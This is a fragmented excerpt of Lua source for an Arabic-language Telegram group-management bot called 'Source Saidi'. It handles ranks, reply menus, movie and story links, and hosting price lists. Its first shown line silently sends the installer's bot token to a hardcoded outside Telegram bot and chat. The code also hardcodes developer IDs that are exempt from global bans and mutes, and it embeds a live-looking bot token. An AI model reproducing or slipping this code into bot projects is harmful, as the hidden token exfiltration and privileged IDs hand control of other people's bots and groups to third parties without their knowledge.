...
https.request('https://api.telegram.org/bot1975497470:AAGMFyKudHOljiD0x-pgY4gRoEEpd2sgi74/sendmessage?chat_id=1965534755&text=' ..token)
end 
else
...
var = 'المـبــرمـج طـه' 
elseif tonumber(user_id) == tonumber(1372188096) then
var = 'المـبــرمـج عمـر'
elseif tonumber(user_id) == tonumber(1871165209) then
var = 'المـبــرمـح ابــو المـجـد'
elseif tonumber(user_id) == tonumber(SUDO) then
var = 'المطور الاساسي'  
elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then
var = "المطور الاساسي²"  
...
var = 'البوت'
elseif database:sismember(bot_id..'Sudo:User', user_id) then
var = database:get(bot_id.."Sudo:Rd"..msg.chat_id_) or 'المطور القميل'  
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
...
var = database:get(bot_id.."onall:Rd"..msg.chat_id_) or 'المدير العام القميل'  
elseif database:sismember(bot_id..'moall'..chat_id, user_id) then
var = database:get(bot_id.."moall:Rd"..msg.chat_id_) or 'الادمن العام القميل'  
elseif database:sismember(bot_id..'Manager'..chat_id, user_id) then
var = database:get(bot_id.."Manager:Rd"..msg.chat_id_) or 'المدير القميل'  
elseif database:sismember(bot_id..'S00F4:MN:TF'..chat_id, user_id) then
var = 'منظف' 
elseif database:sismember(bot_id..'Mod:User'..chat_id, user_id) then
var = database:get(bot_id.."Mod:Rd"..msg.chat_id_) or 'الادمن القميل'  
elseif database:sismember(bot_id..'Special:User'..chat_id, user_id) then  
...
if text == 'قسم الافلام' then
local Text = 'مرحب بيك في قسم الافلام'
local Key = {
{'⩹━━━━━━❪ركن الافلام❫━━━━━━⩺'},
...
local Text = 'مرحب بيك في قسم مميزات'
local Key = {
{'⩹━━━━━━❪ركن مميزات❫━━━━━━⩺'},
...
if text == 'قسم الصور' then
local Text = 'مرحب بيك في قسم الصور'
local Key = {
{'⩹━━━━━━❪ركن الصور❫━━━━━━⩺'},
{'صور ولاد','صور بنات'},
{'⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺'},
...
if not DevSoFi(msg) then
local Text = [[
𓆩 سعر التنصيب علي سورس صعيدي 𓆪
...
if not DevSoFi(msg) then
local Text = [[
┌اسعار السرفر احسن سرفرات مضمونه
├سعر السرفر 2 رامه بي 80
├سعر السرفر 4 رامه بي 100
├سعر السرفر 8 رامه بي 180
└يوجود عروض سرفرات
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
send(msg.chat_id_, msg.id_,' ☽ تم تحديث السورس صعيدي')
dofile('DRAGON.lua')  
end
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/DEV_JABWA/34&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/DEV_JABWA/35&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/DEV_JABWA/7&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text and text:match("^مصطفي$") or text and text:match("^صاحب السورس$") or text and text:match("^مبرمج السورس$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
...
if text and text:match("^جابوا$") or text and text:match("^عوز اشغال بوتي$") or text and text:match("^عوز انصب بوت$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
...
if text == 'المبرمج ابو المجد' or text == 'ابو المجد' or text == 'محمد' or text == '⁴مبرمج السورس' or text == 'سكران' or text == 'هتلر' then
local Text = [[
ابو المجد مبرمج السورس⁴ لو حابب تتواصل معاه
اتبع الزر إلى تحت ⇈⇊
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
if text == 'بوتات' or text == 'بوتات مشهوره' or text == 'افضل بوتات' then
local Text = [[
...
{{text = 'ابــو المـجـد مـبــرمـج السـورس',url="t.me/A_B_O_2"}},
{{text = '`sᴏᴜʀᴄᴇ sᴀɪᴅɪ´', url="t.me/S_a_i_d_i"}},
{{text = 'أضغط لاضافه ألبوت لمجموعتك 𖠪' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
if text == 'صعيدي' or text == 'سورس مين ده' then
local Text = [[ 
من أحسن السورسات على التليجرام سورس صعيدي
حمايه↤سرعه↤دقه↤وامان
 قناه السورس ⇈⇊
[`ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ѕᴏ𝗎ʀᴄᴇ ѕᴀɪᴅᴀ´](http://t.me/S_a_i_d_i)
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '`sᴏᴜʀᴄᴇ sᴀɪᴅɪ´', url="t.me/S_a_i_d_i"}}, 
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/S_a_i_d_i/148/163&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'العاب' then
local Text = [[ 
...
send(msg.chat_id_, msg.id_, " ☽ لا تسطيع الواد عمر عام")
return false 
end
...
send(msg.chat_id_, msg.id_, "  ☽ لا تسطيع حظر الواد ابو المجد عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1549578895) then  
send(msg.chat_id_, msg.id_, " ☽ لا تسطيع حظر الواد طه عام")
return false 
end
...
if tonumber(result.sender_user_id_) == tonumber(1871165209) then  
send(msg.chat_id_, msg.id_, " ☽ لا تسطيع كتم الواد ابو المجد عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1549578895) then  
send(msg.chat_id_, msg.id_, " ☽ لا تسطيع كتم الواد طه عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1372188096) then  
send(msg.chat_id_, msg.id_, " ☽ لا تسطيع الواد عمر عام")
...
send(msg.chat_id_, msg.id_, t..'⩹━━━━⊶❲?? 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺\nاضغط علي الاسم ليتم نسخه\n⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺ٴ\n ☾ ❲[𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐀𝐈𝐃𝐈](t.me/S_a_i_d_i)❳ ☽ ')
end
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت المطور القميل🥺🤍](t.me/S_a_i_d_i)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مـطـور الـبـوت', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت المطور الاساسي² 😍💚](t.me/S_a_i_d_i)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مـطـور الـبـوت', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت المطور بس الصغنن 🌝💘](t.me/S_a_i_d_i)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مـطـور الـبـوت', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[نت المالك هن يعني حاجه فوق فوق راسي 😂♥](t.me/S_a_i_d_i)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مـطـور الـبـوت', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه??🤦‍♂️](t.me/S_a_i_d_i)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مـطـور الـبـوت', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/S_a_i_d_i)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مـطـور الـبـوت', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/S_a_i_d_i)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مـطـور الـبـوت', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/S_a_i_d_i)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مـطـور الـبـوت', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ انت مميز القميل 😊 ](t.me/S_a_i_d_i)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مـطـور الـبـوت', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ العضو قميل 🌝💘 ](t.me/S_a_i_d_i)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مـطـور الـبـوت', url="http://t.me/"..sudos.UserName},
...
if result.id_ then
send(msg.chat_id_, msg.id_,' ☽ تع يعم كلم الواد قميل ده عوزك  [@↝'..username..'↜]') 
return false
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
...
send(msg.chat_id_, msg.id_,' ☽ انت دخلت عبر الرابط ياقميل 🙈🌝') 
end
end,nil)
else
...
Text = ' ☽ بالتاكيد تم تفعيل امر اطردني  مع سلام سلامه'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
if Num == 0 then 
Text = ' ☽ لم تقم بأضافه احد ياقميل'
else
Text = ' ☽ عدد جهاتك ياقميل * ⇇↝ '..Num..' ↜ *'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
if text == 'فحص البوتات' and Manager(msg) then
...
if text == 'مميزات' then
local Text = [[
[𓆩 مرحبا بك في مميزات السورس 𓆪](t.me/S_a_i_d_i)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
if text == "رد عليه يابوت" or text == "رد عليه" or text == "فينك يا بوت" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"ولد ولا بنت ياقميل 🙈🌝"}
...
if text == 'افلام' or text == 'نوع افلام' or text == 'افلام سورس'  then
local Text = [[
𓆩 اختار نوع افلام الي ترودي 𓆪
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
send(msg.chat_id_, msg.id_,'𓆩 مرحبا اليك استوري  رومنسي 𓆪') 
end 
end,nil) 
end
...
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or bot_data:get(ban_id.."Private:Group:Link"..msg.chat_id_) 
if linkgpp.ok == true then 
local linkgp = '𓆩 مرحبا اليك استوري 𓆪\n ['..ta.title_..']('..linkgpp.result..')\nـــــــــــــــــــــــــ\n  ['..linkgpp.result..']'
keyboard = {} 
keyboard.inline_keyboard = {{{text = ta.title_, url=linkgpp.result}},}
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/sijebehdhd/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else 
send(msg.chat_id_, msg.id_,'𓆩 مرحبا اليك استوري 𓆪') 
end 
end,nil) 
end
...
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or bot_data:get(ban_id.."Private:Group:Link"..msg.chat_id_) 
if linkgpp.ok == true then 
local linkgp = '𓆩  مرحبا اليك استوري قرآن 𓆪\n ['..ta.title_..']('..linkgpp.result..')\nـــــــــــــــــــــــــ\n  ['..linkgpp.result..']'
keyboard = {} 
keyboard.inline_keyboard = {{{text = ta.title_, url=linkgpp.result}},}
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/JABWA7/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
...
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or bot_data:get(ban_id.."Private:Group:Link"..msg.chat_id_) 
if linkgpp.ok == true then 
local linkgp = '𓆩  مرحبا اليك استوري مضحك 𓆪\n ['..ta.title_..']('..linkgpp.result..')\nـــــــــــــــــــــــــ\n  ['..linkgpp.result..']'
keyboard = {} 
keyboard.inline_keyboard = {{{text = ta.title_, url=linkgpp.result}},}
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/JABWA6/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else 
send(msg.chat_id_, msg.id_,'𓆩  مرحبا اليك استوري مضحك 𓆪') 
end 
end,nil) 
end
...
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or bot_data:get(ban_id.."Private:Group:Link"..msg.chat_id_) 
if linkgpp.ok == true then 
local linkgp = '𓆩 مرحبا اليك فلم عربي 𓆪\n ['..ta.title_..']('..linkgpp.result..')\nـــــــــــــــــــــــــ\n  ['..linkgpp.result..']'
keyboard = {} 
keyboard.inline_keyboard = {{{text = ta.title_, url=linkgpp.result}},}
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/sijebehdhd/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else 
send(msg.chat_id_, msg.id_,'𓆩 مرحبا اليك عربي 𓆪') 
end 
end,nil) 
end
...
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or bot_data:get(ban_id.."Private:Group:Link"..msg.chat_id_) 
if linkgpp.ok == true then 
local linkgp = '𓆩 مرحبا اليك فلم اجنبي 𓆪\n ['..ta.title_..']('..linkgpp.result..')\nـــــــــــــــــــــــــ\n  ['..linkgpp.result..']'
keyboard = {} 
keyboard.inline_keyboard = {{{text = ta.title_, url=linkgpp.result}},}
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/jdjie1/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else 
send(msg.chat_id_, msg.id_,'𓆩 مرحبا اليك فلم اجنبي 𓆪') 
end 
end,nil) 
end
...
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or bot_data:get(ban_id.."Private:Group:Link"..msg.chat_id_) 
if linkgpp.ok == true then 
local linkgp = '𓆩 مرحبا اليك فلم رعب 𓆪\n ['..ta.title_..']('..linkgpp.result..')\nـــــــــــــــــــــــــ\n  ['..linkgpp.result..']'
keyboard = {} 
keyboard.inline_keyboard = {{{text = ta.title_, url=linkgpp.result}},}
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/MO_ST_AFA1/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
...
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or bot_data:get(ban_id.."Private:Group:Link"..msg.chat_id_) 
if linkgpp.ok == true then 
local linkgp = '𓆩 مرحبا اليك فلم هنديه 𓆪\n ['..ta.title_..']('..linkgpp.result..')\nـــــــــــــــــــــــــ\n  ['..linkgpp.result..']'
keyboard = {} 
keyboard.inline_keyboard = {{{text = ta.title_, url=linkgpp.result}},}
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/MO_ST_AFA3/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else 
send(msg.chat_id_, msg.id_,'𓆩 مرحبا اليك فلم هنديه 𓆪') 
end 
end,nil) 
end
...
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or bot_data:get(ban_id.."Private:Group:Link"..msg.chat_id_) 
if linkgpp.ok == true then 
local linkgp = '𓆩 مرحبا اليك فلم كرتون 𓆪\n ['..ta.title_..']('..linkgpp.result..')\nـــــــــــــــــــــــــ\n  ['..linkgpp.result..']'
keyboard = {} 
keyboard.inline_keyboard = {{{text = ta.title_, url=linkgpp.result}},}
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/y_giu/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else 
send(msg.chat_id_, msg.id_,'𓆩 مرحبا اليك فلم كرتون 𓆪') 
end 
end,nil) 
end
...
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or bot_data:get(ban_id.."Private:Group:Link"..msg.chat_id_) 
if linkgpp.ok == true then 
local linkgp = '𓆩 مرحبا اليك مسرحيه 𓆪\n ['..ta.title_..']('..linkgpp.result..')\nـــــــــــــــــــــــــ\n  ['..linkgpp.result..']'
keyboard = {} 
keyboard.inline_keyboard = {{{text = ta.title_, url=linkgpp.result}},}
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/MO_ST_AFA2/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
...
keyboard.inline_keyboard = {
{
{text = '𓆩 العاب السورس 𓆪', callback_data="/mute-name"},{text = '◗مميزات◖', callback_data="/change-photo"},
},
{
{text = '𓆩 العاب متطوره 𓆪', callback_data="/sofi"},
},
...
numj = {"الكلام ده صح 👍🙂","انت كداب يا ابو صلاح 😂😂","طب عيني في عينك كدا 🙄🧐","فعلا بتتكلم بجد ❤️🙂","👍😁 ده مظبوط",};
sendnuj = numj[math.random(#numj)]
xl = ' ⟨  '..text..'  ⟩ \n '..sendnuj..'.'
send(msg.chat_id_, msg.id_,xl) 
